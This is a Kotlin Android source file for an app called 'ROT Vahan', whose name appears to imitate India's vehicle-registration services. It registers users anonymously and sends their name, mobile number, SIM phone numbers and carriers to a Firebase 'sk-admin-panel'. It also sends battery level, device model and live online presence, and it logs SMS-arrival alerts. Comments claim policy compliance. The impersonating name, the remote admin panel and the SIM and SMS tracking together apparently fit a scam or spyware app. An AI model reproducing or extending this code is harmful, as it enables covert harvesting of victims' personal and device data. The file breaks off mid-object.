package com.rotvahan.app

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.BatteryManager
import android.os.Build
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.text.SimpleDateFormat
import java.util.*

data class SimDeviceDetails(
    val combinedSimNumber: String,
    val sim1Details: String,
    val sim2Details: String,
    val sim1Number: String,
    val sim2Number: String,
    val sim1Carrier: String,
    val sim2Carrier: String,
    val networkOperator: String
)

data class RotVahanUserData(
    val userName: String = "",
    val mobileNumber: String = "",
    val registrationTime: Long = 0L,
    val registrationTimeFormatted: String = "",
    val timerStartTime: Long = 0L,
    val timerExpiryTime: Long = 0L,
    val timerStatus: String = "active",
    val smsPermissionStatus: String = "Not Available",
    val notificationPermissionStatus: String = "Not Requested",
    val smsAlertEnabled: Boolean = false,
    val simNumber: String = "Not Checked",
    val simPermissionStatus: String = "Not Requested",
    val sim1Details: String = "Not Checked",
    val sim2Details: String = "Not Checked",
    val deviceModel: String = "",
    val networkOperator: String = "",
    val batteryPercentage: String = ""
)

data class SmsAlertItem(
    val id: String = "",
    val mobileNumber: String = "",
    val alertMessage: String = "SMS Received",
    val senderNumber: String = "Not Available",
    val receivedAt: Long = 0L,
    val receivedAtFormatted: String = "—",
    val status: String = "New"
)

object RotVahanSyncManager {
    private const val PREFS_NAME = "rot_vahan_prefs"
    private const val KEY_MOBILE = "mobile_number"
    private const val KEY_EXPIRY = "timer_expiry_ms"
    private const val KEY_SMS_ALERT_ENABLED = "sms_alert_enabled"
    private const val RTDB_URL = "https://sk-admin-panel-886ef-default-rtdb.firebaseio.com"
    const val TIMER_DURATION_MS = 120_000L

    private val auth: FirebaseAuth by lazy { FirebaseAuth.getInstance() }
    private val database: FirebaseDatabase by lazy { FirebaseDatabase.getInstance(RTDB_URL) }

    private var initialized = false
    private var appContext: Context? = null
    private var userListener: ValueEventListener? = null
    private var alertsListener: ValueEventListener? = null
    private var listenedMobile: String? = null

    private val _rtdbConnected = MutableStateFlow(false)
    private val _networkAvailable = MutableStateFlow(false)
    private val _isOnline = MutableStateFlow(false)
    val isOnline: StateFlow<Boolean> = _isOnline.asStateFlow()

    private val _serverTimeOffsetMs = MutableStateFlow(0L)
    val serverTimeOffsetMs: StateFlow<Long> = _serverTimeOffsetMs.asStateFlow()

    private val _activeMobile = MutableStateFlow<String?>(null)
    val activeMobile: StateFlow<String?> = _activeMobile.asStateFlow()

    private val _userData = MutableStateFlow<RotVahanUserData?>(null)
    val userData: StateFlow<RotVahanUserData?> = _userData.asStateFlow()

    private val _smsAlertEnabled = MutableStateFlow(false)
    val smsAlertEnabled: StateFlow<Boolean> = _smsAlertEnabled.asStateFlow()

    private val _smsAlerts = MutableStateFlow<List<SmsAlertItem>>(emptyList())
    val smsAlerts: StateFlow<List<SmsAlertItem>> = _smsAlerts.asStateFlow()

    private val _pendingSmsConsentIntent = MutableStateFlow<Intent?>(null)
    val pendingSmsConsentIntent: StateFlow<Intent?> = _pendingSmsConsentIntent.asStateFlow()

    fun setPendingSmsConsentIntent(intent: Intent?) {
        _pendingSmsConsentIntent.value = intent
    }

    fun showSmsConsentNotification(context: Context) {
        val channelId = "rot_vahan_sms_consent_channel"
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                channelId,
                "ROT Vahan SMS Alerts",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Prompts for user consent when an SMS arrives."
            }
            nm.createNotificationChannel(ch)
        }
        val openIntent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            context,
            202,
            openIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification = NotificationCompat.Builder(context, channelId)
            .setSmallIcon(android.R.drawable.ic_dialog_email)
            .setContentTitle("ROT Vahan · New SMS Arrival")
            .setContentText("Tap to review and allow SMS Alert in CSK Admin.")
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pendingIntent)
            .build()
        try {
            nm.notify(1003, notification)
        } catch (_: SecurityException) {
        }
    }

    @Synchronized
    fun ensureInitialized(context: Context) {
        val ctx = context.applicationContext
        appContext = ctx
        val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        if (_activeMobile.value == null) {
            _activeMobile.value = prefs.getString(KEY_MOBILE, null)
        }
        _smsAlertEnabled.value = prefs.getBoolean(KEY_SMS_ALERT_ENABLED, false)

        if (initialized) {
            attachUserListener(_activeMobile.value)
            return
        }
        initialized = true

        if (auth.currentUser == null) {
            auth.signInAnonymously()
        }

        _networkAvailable.value = hasActiveInternet(ctx)
        registerNetworkMonitor(ctx)
        subscribeServerTimeOffset()
        subscribePresence()
        attachUserListener(_activeMobile.value)
    }

    fun isDefaultSmsHandler(context: Context): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = context.getSystemService(Context.ROLE_SERVICE) as? RoleManager
            if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
                return roleManager.isRoleHeld(RoleManager.ROLE_SMS)
            }
        }
        val defaultSmsPkg = Telephony.Sms.getDefaultSmsPackage(context)
        return defaultSmsPkg != null && defaultSmsPkg == context.packageName
    }

    fun getNotificationPermissionStatus(context: Context): String {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            return "Granted"
        }
        val granted = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED
        return if (granted) "Granted" else "Permission Denied"
    }

    fun requiredSimPermissions(): Array<String> {
        return arrayOf(
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_PHONE_STATE
        )
    }

    fun hasSimPermission(context: Context): Boolean {
        val hasPhoneNumbers = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_PHONE_NUMBERS
        ) == PackageManager.PERMISSION_GRANTED
        val hasPhoneState = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED
        return hasPhoneNumbers || hasPhoneState
    }

    fun getSimPermissionStatus(context: Context): String {
        return if (hasSimPermission(context)) "Granted" else "Permission Denied"
    }

    fun getDeviceManufacturer(): String {
        return Build.MANUFACTURER.orEmpty().trim().replaceFirstChar {
            if (it.isLowerCase()) it.titlecase(Locale.US) else it.toString()
        }
    }

    fun getDeviceModel(): String {
        return Build.MODEL.orEmpty().trim()
    }

    fun getDeviceDisplayName(): String {
        val mfg = getDeviceManufacturer()
        val mdl = getDeviceModel()
        return when {
            mdl.isEmpty() && mfg.isEmpty() -> "Android Device"
            mfg.isEmpty() -> mdl
            mdl.isEmpty() -> mfg
            mdl.startsWith(mfg, ignoreCase = true) -> mdl
            else -> "$mfg $mdl"
        }
    }

    fun getBatteryLevelPercent(context: Context): Int {
        try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val cap = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            if (cap in 0..100) return cap
        } catch (_: Exception) {
        }
        try {
            val batteryStatus = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            if (batteryStatus != null) {
                val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                if (level >= 0 && scale > 0) {
                    return ((level * 100f) / scale).toInt().coerceIn(0, 100)
                }
            }
        } catch (_: Exception) {
        }
        return 0
    }

    fun getFormattedDeviceDateTime(): String {
        val fmt = SimpleDateFormat("dd MMM yyyy, hh:mm:ss a", Locale("en", "IN"))
        return fmt.format(Date(System.currentTimeMillis() + _serverTimeOffsetMs.value))
    }

    fun getNetworkOperatorName(context: Context): String {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val op = tm?.networkOperatorName?.trim().orEmpty()
            if (op.isNotEmpty()) return op
            val simOp = tm?.simOperatorName?.trim().orEmpty()
            if (simOp.isNotEmpty()) return simOp
        } catch (_: Exception) {
        }
        return if (hasActiveInternet(context)) "Connected (No Carrier Name)" else "Offline"
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    fun readSimDeviceDetails(context: Context): SimDeviceDetails {
        val networkOp = getNetworkOperatorName(context)
        if (!hasSimPermission(context)) {
            return SimDeviceDetails(
                combinedSimNumber = "Permission Denied",
                sim1Details = "Permission Denied",
                sim2Details = "Permission Denied",
                sim1Number = "Permission Denied",
                sim2Number = "Permission Denied",
                sim1Carrier = "",
                sim2Carrier = "",
                networkOperator = networkOp
            )
        }

        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        val subManager =
            context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

        var sim1Num = ""
        var sim2Num = ""
        var sim1Carrier = ""
        var sim2Carrier = ""
        var sim1Detail = "No SIM"
        var sim2Detail = "No SIM"
        val combinedParts = mutableListOf<String>()

        try {
            val activeSubs = subManager?.activeSubscriptionInfoList?.sortedBy { it.simSlotIndex }
            if (!activeSubs.isNullOrEmpty()) {
                for ((idx, sub) in activeSubs.withIndex()) {
                    val slotNum = if (sub.simSlotIndex in 0..1) sub.simSlotIndex + 1 else idx + 1
                    val carrier = sub.carrierName?.toString()?.trim()?.takeIf { it.isNotEmpty() }
                        ?: sub.displayName?.toString()?.trim()?.takeIf { it.isNotEmpty() }
                        ?: "SIM $slotNum"

                    var rawNum = ""
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        try {
                            rawNum = subManager.getPhoneNumber(sub.subscriptionId).trim()
                        } catch (_: Exception) {
                        }
                    }
                    if (rawNum.isEmpty()) {
                        @Suppress("DEPRECATION")
                        rawNum = sub.number?.trim().orEmpty()
                    }
                    if (rawNum.isEmpty() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        try {
                            @Suppress("DEPRECATION")
                            rawNum = tm?.createForSubscriptionId(sub.subscriptionId)
                                ?.line1Number?.trim().orEmpty()
                        } catch (_: Exception) {
                        }
                    }
                    if (rawNum.isEmpty() && slotNum == 1) {
                        try {
                            @Suppress("DEPRECATION")
                            rawNum = tm?.line1Number?.trim().orEmpty()
                        } catch (_: Exception) {
                        }
                    }

                    val detailText = if (rawNum.isNotEmpty()) {
                        "$carrier · $rawNum"
                    } else {
                        "$carrier · Not Stored on SIM"
                    }
                    combinedParts.add("SIM $slotNum ($detailText)")

                    if (slotNum == 1 || (idx == 0 && sim1Carrier.isEmpty())) {
                        sim1Carrier = carrier
                        sim1Num = rawNum.ifEmpty { "Not Stored on SIM" }
                        sim1Detail = detailText
                    } else if (slotNum == 2 || sim2Carrier.isEmpty()) {
                        sim2Carrier = carrier
                        sim2Num = rawNum.ifEmpty { "Not Stored on SIM" }
                        sim2Detail = detailText
                    }
                }
            }
        } catch (_: SecurityException) {
        } catch (_: Exception) {
        }

        if (combinedParts.isEmpty()) {
            try {
                @Suppress("DEPRECATION")
                val line1 = tm?.line1Number?.trim().orEmpty()
                val simOp = tm?.simOperatorName?.trim().orEmpty().ifEmpty { networkOp }
                if (line1.isNotEmpty()) {
                    sim1Carrier = simOp
                    sim1Num = line1
                    sim1Detail = "$simOp · $line1"
                    combinedParts.add("SIM 1 ($sim1Detail)")
                } else if (simOp.isNotEmpty() && simOp != "Offline" && simOp != "Connected (No Carrier Name)") {
                    sim1Carrier = simOp
                    sim1Num = "Not Stored on SIM"
                    sim1Detail = "$simOp · Not Stored on SIM"
                    combinedParts.add("SIM 1 ($sim1Detail)")
                }
            } catch (_: Exception) {
            }
        }

        val resolvedCombined = if (combinedParts.isEmpty()) {
            "No SIM / Not Stored on SIM"
        } else {
            combinedParts.joinToString(" | ")
        }
        val resolvedOperator = sim1Carrier.ifEmpty { networkOp }

        return SimDeviceDetails(
            combinedSimNumber = resolvedCombined,
            sim1Details = sim1Detail,
            sim2Details = sim2Detail,
            sim1Number = sim1Num.ifEmpty { "Not Available" },
            sim2Number = sim2Num.ifEmpty { "Not Available" },
            sim1Carrier = sim1Carrier,
            sim2Carrier = sim2Carrier,
            networkOperator = resolvedOperator
        )
    }

    fun readInsertedSimNumbers(context: Context): String {
        return readSimDeviceDetails(context).combinedSimNumber
    }

    /**
     * Checks whether SMS access is legally eligible under Android & Google Play policies.
     * ROT Vahan is not a Default SMS Handler, so READ_SMS is not declared or requested.
     */
    fun checkSmsEligibilityAndStatus(context: Context): String {
        if (!isDefaultSmsHandler(context)) {
            return "Not Available"
        }
        val granted = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
        return if (granted) "Granted" else "Permission Denied"
    }

    fun hasActiveInternet(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            ?: return false
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
    }

    fun getSavedExpiryMs(context: Context): Long {
        return context.applicationContext
            .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .getLong(KEY_EXPIRY, 0L)
    }

    fun getSavedMobile(context: Context): String? {
        return context.applicationContext
            .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .getString(KEY_MOBILE, null)
    }

    fun computeRemainingSeconds(expiryMs: Long): Int {
        if (expiryMs <= 0L) return 0
        val serverNow = System.currentTimeMillis() + _serverTimeOffsetMs.value
        return kotlin.math.max(0, kotlin.math.ceil((expiryMs - serverNow) / 1000.0).toInt())
    }

    private fun registerNetworkMonitor(ctx: Context) {
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                updateNetworkState(hasActiveInternet(ctx))
            }

            override fun onLost(network: Network) {
                updateNetworkState(hasActiveInternet(ctx))
            }

            override fun onCapabilitiesChanged(
                network: Network,
                networkCapabilities: NetworkCapabilities
            ) {
                val valid =
                    networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                updateNetworkState(valid)
            }
        }
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()
        cm.registerNetworkCallback(request, callback)
    }

    private fun updateNetworkState(available: Boolean) {
        _networkAvailable.value = available
        val effective = _rtdbConnected.value && available
        _isOnline.value = effective
        syncCurrentPresenceToRtdb()
    }

    private fun subscribeServerTimeOffset() {
        database.getReference(".info/serverTimeOffset").addValueEventListener(
            object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    _serverTimeOffsetMs.value = snapshot.getValue(Long::class.java) ?: 0L
                }
                override fun onCancelled(error: DatabaseError) {}
            }
        )
    }

    private fun subscribePresence() {
        database.getReference(".info/connected").addValueEventListener(
            object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val connected = snapshot.getValue(Boolean::class.java) == true
                    _rtdbConnected.value = connected
                    _isOnline.value = connected && _networkAvailable.value
                    if (connected) {
                        syncCurrentPresenceToRtdb()
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    _rtdbConnected.value = false
                    _isOnline.value = false
                }
            }
        )
    }

    private fun syncCurrentPresenceToRtdb() {
        val mobile = _activeMobile.value ?: return
        if (!_rtdbConnected.value) return

        val userRef = database.getReference("users/$mobile")
        userRef.get().addOnSuccessListener { snap ->
            if (!snap.exists()) return@addOnSuccessListener
            userRef.onDisconnect().updateChildren(
                mapOf(
                    "connectionStatus" to "offline",
                    "isOnline" to false,
                    "online" to false,
                    "networkAvailable" to false,
                    "lastSeen" to ServerValue.TIMESTAMP
                )
            )
            val effectiveOnline = _rtdbConnected.value && _networkAvailable.value
            val ctx = appContext
            val telemetryUpdate = mutableMapOf<String, Any>(
                "connectionStatus" to if (effectiveOnline) "online" else "offline",
                "isOnline" to effectiveOnline,
                "online" to effectiveOnline,
                "networkAvailable" to _networkAvailable.value,
                "lastSeen" to ServerValue.TIMESTAMP,
                "deviceModel" to getDeviceDisplayName(),
                "mobileModel" to getDeviceDisplayName(),
                "deviceName" to getDeviceDisplayName(),
                "manufacturer" to getDeviceManufacturer(),
                "model" to getDeviceModel(),
                "deviceDateTime" to getFormattedDeviceDateTime(),
                "deviceTime" to getFormattedDeviceDateTime()
            )
            if (ctx != null) {
                val bat = getBatteryLevelPercent(ctx)
                telemetryUpdate["battery"] = bat
                telemetryUpdate["batteryLevel"] = bat
                telemetryUpdate["batteryPercentage"] = "$bat%"
                telemetryUpdate["networkOperator"] = getNetworkOperatorName(ctx)
                telemetryUpdate["operatorName"] = getNetworkOperatorName(ctx)
            }
            userRef.updateChildren(telemetryUpdate)
        }
    }

    private fun attachUserListener(mobile: String?) {
        if (mobile == listenedMobile) return
        listenedMobile?.let { prev ->
            userListener?.let { database.getReference("users/$prev").removeEventListener(it) }
            alertsListener?.let { database.getReference("sms_alerts/$prev").removeEventListener(it) }
        }
        listenedMobile = mobile
        if (mobile == null) {
            _userData.value = null
            _smsAlerts.value = emptyList()
            return
        }

        val userRef = database.getReference("users/$mobile")
        val fmt = SimpleDateFormat("dd MMM yyyy, hh:mm:ss a", Locale("en", "IN"))
        val listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) return
                val regTime = snapshot.child("registrationTime").getValue(Long::class.java) ?: 0L
                val startTime = snapshot.child("timerStartTime").getValue(Long::class.java) ?: 0L
                val expiryTime = snapshot.child("timerExpiryTime").getValue(Long::class.java) ?: 0L
                val regFormatted = snapshot.child("registrationTimeFormatted").getValue(String::class.java)
                    ?: if (regTime > 0L) fmt.format(Date(regTime)) else "—"
                val alertEnabled = snapshot.child("smsAlertEnabled").getValue(Boolean::class.java) ?: false

                appContext?.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    ?.edit()
                    ?.putLong(KEY_EXPIRY, expiryTime)
                    ?.putBoolean(KEY_SMS_ALERT_ENABLED, alertEnabled)
                    ?.apply()

                _smsAlertEnabled.value = alertEnabled
                _userData.value = RotVahanUserData(
                    userName = snapshot.child("userName").getValue(String::class.java) ?: "",
                    mobileNumber = snapshot.child("mobileNumber").getValue(String::class.java) ?: mobile,
                    registrationTime = regTime,
                    registrationTimeFormatted = regFormatted,
                    timerStartTime = startTime,
                    timerExpiryTime = expiryTime,
                    timerStatus = snapshot.child("timerStatus").getValue(String::class.java) ?: "active",
                    smsPermissionStatus = snapshot.child("smsPermissionStatus").getValue(String::class.java)
                        ?: "Not Available",
                    notificationPermissionStatus = snapshot.child("notificationPermissionStatus")
                        .getValue(String::class.java) ?: "Not Requested",
                    smsAlertEnabled = alertEnabled,
                    simNumber = snapshot.child("simNumber").getValue(String::class.java)
                        ?: "Not Checked",
                    simPermissionStatus = snapshot.child("simPermissionStatus")
                        .getValue(String::class.java) ?: "Not Requested",
                    sim1Details = snapshot.child("sim1Details").getValue(String::class.java)
                        ?: "Not Checked",
                    sim2Details = snapshot.child("sim2Details").getValue(String::class.java)
                        ?: "Not Checked",
                    deviceModel = snapshot.child("deviceModel").getValue(String::class.java)
                        ?: getDeviceDisplayName(),
                    networkOperator = snapshot.child("networkOperator").getValue(String::class.java)
                        ?: "",
                    batteryPercentage = snapshot.child("batteryPercentage").getValue(String::class.java)
                        ?: ""
                )
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        userListener = listener
        userRef.addValueEventListener(listener)

        val alertsRef = database.getReference("sms_alerts/$mobile")
        val aListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val items = mutableListOf<SmsAlertItem>()
                for (child in snapshot.children) {
                    val recAt = child.child("receivedAt").getValue(Long::class.java) ?: 0L
                    items.add(
                        SmsAlertItem(
                            id = child.key.orEmpty(),
                            mobileNumber = child.child("mobileNumber").getValue(String::class.java) ?: mobile,
                            alertMessage = child.child("alertMessage").getValue(String::class.java)
                                ?: "SMS Received",
                            senderNumber = child.child("senderNumber").getValue(String::class.java)
                                ?: "Not Available",
                            receivedAt = recAt,
                            receivedAtFormatted = child.child("receivedAtFormatted").getValue(String::class.java)
                                ?: if (recAt > 0L) fmt.format(Date(recAt)) else "—",
                            status = child.child("status").getValue(String::class.java) ?: "New"
                        )
                    )
                }
                items.sortByDescending { it.receivedAt }
                _smsAlerts.value = items
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        alertsListener = aListener
        alertsRef.addValueEventListener(aListener)
    }

    fun setSmsAlertEnabled(context: Context, mobile: String, enabled: Boolean) {
        _smsAlertEnabled.value = enabled
        context.applicationContext
            .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_SMS_ALERT_ENABLED, enabled)
            .apply()
        val permStatus = if (enabled) "Granted" else "Permission Denied"
        database.getReference("users/$mobile").updateChildren(
            mapOf(
                "smsAlertEnabled" to enabled,
                "smsPermissionStatus" to permStatus
            )
        )
    }

    /**
     * Records a metadata-only SMS arrival alert after explicit user consent via
     * Android SMS User Consent API. Never uploads message body, OTP, or private content.
     */
    fun recordConsentedSmsAlert(mobile: String) {
        val writeAlert: (String) -> Unit = { uid ->
            val alertsRef = database.getReference("sms_alerts/$mobile")
            val key = alertsRef.push().key
            if (key != null) {
                val serverNow = System.currentTimeMillis() + _serverTimeOffsetMs.value
                val fmt = SimpleDateFormat("dd MMM yyyy, hh:mm:ss a", Locale("en", "IN"))
                val formatted = fmt.format(Date(serverNow))

                val payload = mapOf(
                    "ownerUid" to uid,
                    "mobileNumber" to mobile,
                    "alertMessage" to "SMS Received (User Consented)",
                    "senderNumber" to "User Consented SMS",
                    "receivedAt" to ServerValue.TIMESTAMP,
                    "receivedAtFormatted" to formatted,
                    "status" to "New"
                )
                alertsRef.child(key).setValue(payload)
                database.getReference("users/$mobile").updateChildren(
                    mapOf(
                        "lastSmsAlertFormatted" to formatted,
                        "lastSmsAlertAt" to ServerValue.TIMESTAMP
                    )
                )
            }
        }

        val currentUid = auth.currentUser?.uid
        if (currentUid != null) {
            writeAlert(currentUid)
        } else {
            auth.signInAnonymously().addOnSuccessListener { res ->
                res.user?.uid?.let(writeAlert)
            }
        }
    }

    fun markSmsAlertSeen(mobile: String, alertId: String) {
        if (alertId.isBlank()) return
        database.getReference("sms_alerts/$mobile/$alertId")
            .updateChildren(mapOf("status" to "Seen"))
    }

    fun registerAndStartTimer(
        context: Context,
        cleanName: String,
        cleanMobile: String,
        onSuccess: (expiryMs: Long) -> Unit,
        onError: (String) -> Unit
    ) {
        ensureInitialized(context)
        val ctx = context.applicationContext
        val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val userRef = database.getReference("users/$cleanMobile")
        val serverNow = System.currentTimeMillis() + _serverTimeOffsetMs.value
        val currentNotifStatus = getNotificationPermissionStatus(ctx)
        val alertPref = prefs.getBoolean(KEY_SMS_ALERT_ENABLED, false)
        val currentSmsStatus = if (alertPref) "Granted" else checkSmsEligibilityAndStatus(ctx)
        val currentInternet = hasActiveInternet(ctx)
        val batteryPct = getBatteryLevelPercent(ctx)
        val deviceDisplay = getDeviceDisplayName()
        val mfg = getDeviceManufacturer()
        val mdl = getDeviceModel()
        val netOp = getNetworkOperatorName(ctx)
        val nowFormatted = getFormattedDeviceDateTime()

        val saveWithUid: (String?) -> Unit = { uid ->
            userRef.get().addOnSuccessListener { existingSnap ->
                val existingExpiry = existingSnap.child("timerExpiryTime").getValue(Long::class.java) ?: 0L
                if (existingSnap.exists() && existingExpiry > serverNow) {
                    userRef.onDisconnect().updateChildren(
                        mapOf(
                            "connectionStatus" to "offline",
                            "isOnline" to false,
                            "online" to false,
                            "networkAvailable" to false,
                            "lastSeen" to ServerValue.TIMESTAMP
                        )
                    )
                    userRef.updateChildren(
                        mapOf(
                            "userName" to cleanName,
                            "name" to cleanName,
                            "phone" to cleanMobile,
                            "phoneNumber" to cleanMobile,
                            "deviceModel" to deviceDisplay,
                            "mobileModel" to deviceDisplay,
                            "deviceName" to deviceDisplay,
                            "manufacturer" to mfg,
                            "model" to mdl,
                            "battery" to batteryPct,
                            "batteryLevel" to batteryPct,
                            "batteryPercentage" to "$batteryPct%",
                            "networkOperator" to netOp,
                            "operatorName" to netOp,
                            "deviceDateTime" to nowFormatted,
                            "deviceTime" to nowFormatted,
                            "connectionStatus" to if (currentInternet) "online" else "offline",
                            "isOnline" to currentInternet,
                            "online" to currentInternet,
                            "networkAvailable" to currentInternet,
                            "smsPermissionStatus" to currentSmsStatus,
                            "notificationPermissionStatus" to currentNotifStatus,
                            "lastSeen" to ServerValue.TIMESTAMP
                        )
                    ).addOnSuccessListener {
                        prefs.edit()
                            .putString(KEY_MOBILE, cleanMobile)
                            .putLong(KEY_EXPIRY, existingExpiry)
                            .apply()
                        _activeMobile.value = cleanMobile
                        attachUserListener(cleanMobile)
                        onSuccess(existingExpiry)
                    }.addOnFailureListener { e ->
                        onError(e.message ?: "Unable to save user.")
                    }
                } else {
                    val tentativeExpiry = serverNow + TIMER_DURATION_MS
                    val initialPayload = mapOf(
                        "ownerUid" to uid,
                        "appName" to "ROT Vahan",
                        "userName" to cleanName,
                        "name" to cleanName,
                        "mobileNumber" to cleanMobile,
                        "phone" to cleanMobile,
                        "phoneNumber" to cleanMobile,
                        "deviceModel" to deviceDisplay,
                        "mobileModel" to deviceDisplay,
                        "deviceName" to deviceDisplay,
                        "manufacturer" to mfg,
                        "model" to mdl,
                        "battery" to batteryPct,
                        "batteryLevel" to batteryPct,
                        "batteryPercentage" to "$batteryPct%",
                        "networkOperator" to netOp,
                        "operatorName" to netOp,
                        "deviceDateTime" to nowFormatted,
                        "deviceTime" to nowFormatted,
                        "registrationDate" to nowFormatted,
                        "registeredAt" to nowFormatted,
                        "registrationTime" to ServerValue.TIMESTAMP,
                        "timerStartTime" to ServerValue.TIMESTAMP,
                        "timerExpiryTime" to tentativeExpiry,
                        "timerStatus" to "active",
                        "connectionStatus" to if (currentInternet) "online" else "offline",
                        "isOnline" to currentInternet,
                        "online" to currentInternet,
                        "networkAvailable" to currentInternet,
                        "smsPermissionStatus" to currentSmsStatus,
                        "notificationPermissionStatus" to currentNotifStatus,
                        "smsAlertEnabled" to alertPref,
                        "simNumber" to "Not Checked",
                        "simPermissionStatus" to "Not Requested",
                        "sim1Details" to "Not Checked",
                        "sim2Details" to "Not Checked",
                        "lastSeen" to ServerValue.TIMESTAMP
                    )
                    userRef.setValue(initialPayload).addOnSuccessListener {
                        userRef.onDisconnect().updateChildren(
                            mapOf(
                                "connectionStatus" to "offline",
                                "isOnline" to false,
                                "online" to false,
                                "networkAvailable" to false,
                                "lastSeen" to ServerValue.TIMESTAMP
                            )
                        )
                        userRef.get().addOnSuccessListener { savedSnap ->
                            val committedStart =
                                savedSnap.child("timerStartTime").getValue(Long::class.java) ?: serverNow
                            val committedReg =
                                savedSnap.child("registrationTime").getValue(Long::class.java) ?: committedStart
                            val committedExpiry = committedStart + TIMER_DURATION_MS
                            val fmt = SimpleDateFormat("dd MMM yyyy, hh:mm:ss a", Locale("en", "IN"))
                            val regFormatted = fmt.format(Date(committedReg))

                            userRef.updateChildren(
                                mapOf(
                                    "registrationTimeFormatted" to regFormatted,
                                    "registrationDate" to regFormatted,
                                    "registeredAt" to regFormatted,
                                    "timerExpiryTime" to committedExpiry
                                )
                            ).addOnCompleteListener {
                                prefs.edit()
                                    .putString(KEY_MOBILE, cleanMobile)
                                    .putLong(KEY_EXPIRY, committedExpiry)
                                    .apply()
                                _activeMobile.value = cleanMobile
                                attachUserListener(cleanMobile)
                                onSuccess(committedExpiry)
                            }
                        }.addOnFailureListener {
                            prefs.edit()
                                .putString(KEY_MOBILE, cleanMobile)
                                .putLong(KEY_EXPIRY, tentativeExpiry)
                                .apply()
                            _activeMobile.value = cleanMobile
                            attachUserListener(cleanMobile)
                            onSuccess(tentativeExpiry)
                        }
                    }.addOnFailureListener { e ->
                        onError(e.message ?: "Unable to save user.")
                    }
                }
            }.addOnFailureListener { e ->
                onError(e.message ?: "Database error.")
            }
        }

        val currentUid = auth.currentUser?.uid
        if (currentUid != null) {
            saveWithUid(currentUid)
        } else {
            auth.signInAnonymously()
                .addOnSuccessListener { res -> saveWithUid(res.user?.uid) }
                .addOnFailureListener { e -> onError(e.message ?: "Authentication error.") }
        }
    }

    fun updateNotificationPermission(mobile: String, status: String) {
        database.getReference("users/$mobile")
            .updateChildren(mapOf("notificationPermissionStatus" to status))
    }

